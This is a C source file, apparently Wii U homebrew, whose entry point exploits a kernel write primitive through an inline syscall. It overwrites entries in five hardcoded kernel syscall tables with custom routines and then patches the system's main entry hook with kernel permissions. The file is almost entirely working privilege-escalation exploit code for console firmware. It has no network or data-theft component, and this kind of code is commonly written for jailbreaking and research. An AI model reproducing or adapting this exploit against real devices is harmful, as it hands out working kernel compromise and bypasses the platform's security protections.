#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <malloc.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#include "main.h"
#include "ios_exploit.h"
#define OSDynLoad_Acquire ((void (*)(char* rpl, unsigned int *handle))0x0102A3B4)
#define OSDynLoad_FindExport ((void (*)(unsigned int handle, int isdata, char *symbol, void *address))0x0102B828)
#define OSFatal ((void (*)(char* msg))0x01031618)

#define EXPORT_DECL(res, func, ...) res (* func)(__VA_ARGS__);
#define OS_FIND_EXPORT(handle, funcName, func) OSDynLoad_FindExport(handle, 0, funcName, &func)

#define ADDRESS_OSTitle_main_entry_ptr              0x1005E040
#define ADDRESS_main_entry_hook                     0x0101c56c

#define KERN_SYSCALL_TBL_1                          0xFFE84C70 // unknown
#define KERN_SYSCALL_TBL_2                          0xFFE85070 // works with games
#define KERN_SYSCALL_TBL_3                          0xFFE85470 // works with loader
#define KERN_SYSCALL_TBL_4                          0xFFEAAA60 // works with home menu
#define KERN_SYSCALL_TBL_5                          0xFFEAAE60 // works with browser (previously KERN_SYSCALL_TBL)

/* assembly functions */
extern void Syscall_0x36(void);
extern void KernelPatches(void);
extern void SCKernelCopyData(unsigned int addr, unsigned int src, unsigned int len);

extern void SC_0x25_KernelCopyData(unsigned int addr, unsigned int src, unsigned int len);

void __attribute__ ((noinline)) kern_write(void *addr, uint32_t value);

typedef struct _private_data_t {
    EXPORT_DECL(void *, MEMAllocFromDefaultHeapEx,int size, int align);
    EXPORT_DECL(void, MEMFreeToDefaultHeap,void *ptr);

    EXPORT_DECL(void*, memcpy, void *p1, const void *p2, unsigned int s);
    EXPORT_DECL(void*, memset, void *p1, int val, unsigned int s);

    EXPORT_DECL(unsigned int, OSEffectiveToPhysical, const void*);
    EXPORT_DECL(void, exit, int);
    EXPORT_DECL(void, DCInvalidateRange, const void *addr, unsigned int length);
    EXPORT_DECL(void, DCFlushRange, const void *addr, unsigned int length);
    EXPORT_DECL(void, ICInvalidateRange, const void *addr, unsigned int length);
    EXPORT_DECL(void, OSForceFullRelaunch);

    EXPORT_DECL(void, SYSRelaunchTitle, int argc, char** argv);
    EXPORT_DECL(void, SYSLaunchMenu);
} private_data_t;


static void loadFunctionPointers(private_data_t * private_data) {
    unsigned int coreinit_handle;

    OSDynLoad_Acquire("coreinit", &coreinit_handle);

    unsigned int *functionPtr = 0;

    OSDynLoad_FindExport(coreinit_handle, 1, "MEMAllocFromDefaultHeapEx", &functionPtr);
    private_data->MEMAllocFromDefaultHeapEx = (void * (*)(int, int))*functionPtr;
    OSDynLoad_FindExport(coreinit_handle, 1, "MEMFreeToDefaultHeap", &functionPtr);
    private_data->MEMFreeToDefaultHeap = (void (*)(void *))*functionPtr;

    OS_FIND_EXPORT(coreinit_handle, "memcpy", private_data->memcpy);
    OS_FIND_EXPORT(coreinit_handle, "memset", private_data->memset);
    OS_FIND_EXPORT(coreinit_handle, "DCFlushRange", private_data->DCFlushRange);
    OS_FIND_EXPORT(coreinit_handle, "DCInvalidateRange", private_data->DCInvalidateRange);
    OS_FIND_EXPORT(coreinit_handle, "ICInvalidateRange", private_data->ICInvalidateRange);
    OS_FIND_EXPORT(coreinit_handle, "OSEffectiveToPhysical", private_data->OSEffectiveToPhysical);
    OS_FIND_EXPORT(coreinit_handle, "OSForceFullRelaunch", private_data->OSForceFullRelaunch);
    OS_FIND_EXPORT(coreinit_handle, "exit", private_data->exit);

    unsigned int sysapp_handle;
    OSDynLoad_Acquire("sysapp.rpl", &sysapp_handle);
    OS_FIND_EXPORT(sysapp_handle, "SYSRelaunchTitle", private_data->SYSRelaunchTitle);
    OS_FIND_EXPORT(sysapp_handle, "SYSLaunchMenu", private_data->SYSLaunchMenu);
}

void KernelWriteU32(uint32_t addr, uint32_t value, private_data_t * pdata) {
    pdata->ICInvalidateRange(&value, 4);
    pdata->DCFlushRange(&value, 4);

    uint32_t dst = (uint32_t) pdata->OSEffectiveToPhysical((void *)addr);
    uint32_t src = (uint32_t) pdata->OSEffectiveToPhysical((void *)&value);

    SC_0x25_KernelCopyData(dst, src, 4);

    pdata->DCFlushRange((void *)addr, 4);
    pdata->ICInvalidateRange((void *)addr, 4);
}

int _start(int argc, char **argv) {
    kern_write((void*)(KERN_SYSCALL_TBL_1 + (0x25 * 4)), (unsigned int)SCKernelCopyData);
    kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x25 * 4)), (unsigned int)SCKernelCopyData);
    kern_write((void*)(KERN_SYSCALL_TBL_3 + (0x25 * 4)), (unsigned int)SCKernelCopyData);
    kern_write((void*)(KERN_SYSCALL_TBL_4 + (0x25 * 4)), (unsigned int)SCKernelCopyData);
    kern_write((void*)(KERN_SYSCALL_TBL_5 + (0x25 * 4)), (unsigned int)SCKernelCopyData);

    kern_write((void*)(KERN_SYSCALL_TBL_1 + (0x36 * 4)), (unsigned int)KernelPatches);
    kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x36 * 4)), (unsigned int)KernelPatches);
    kern_write((void*)(KERN_SYSCALL_TBL_3 + (0x36 * 4)), (unsigned int)KernelPatches);
    kern_write((void*)(KERN_SYSCALL_TBL_4 + (0x36 * 4)), (unsigned int)KernelPatches);
    kern_write((void*)(KERN_SYSCALL_TBL_5 + (0x36 * 4)), (unsigned int)KernelPatches);

    Syscall_0x36();
    
    private_data_t private_data;
    loadFunctionPointers(&private_data);
    
    unsigned int repl_addr = ADDRESS_main_entry_hook;
    unsigned int bufferU32 = 0x4E800421;
    KernelWriteU32(repl_addr,bufferU32,&private_data);
    
    return Menu_Main(argc, argv);
}

/* Write a 32-bit word with kernel permissions */
void __attribute__ ((noinline)) kern_write(void *addr, uint32_t value) {
    asm volatile (
        "li 3,1\n"
        "li 4,0\n"
        "mr 5,%1\n"
        "li 6,0\n"
        "li 7,0\n"
        "lis 8,1\n"
        "mr 9,%0\n"
        "mr %1,1\n"
        "li 0,0x3500\n"
        "sc\n"
        "nop\n"
        "mr 1,%1\n"
        :
        :	"r"(addr), "r"(value)
        :	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
        "11", "12"
    );
}